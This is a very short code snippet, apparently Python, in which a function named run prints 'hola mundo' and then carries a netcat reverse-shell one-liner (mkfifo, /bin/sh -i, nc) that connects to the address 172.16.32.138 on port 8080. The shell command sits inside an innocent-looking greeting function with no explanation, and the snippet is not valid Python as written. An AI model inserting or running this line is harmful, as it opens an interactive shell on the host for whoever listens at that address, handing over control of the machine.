def run():
  print('hola mundo')
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.16.32.138 8080 >/tmp/f
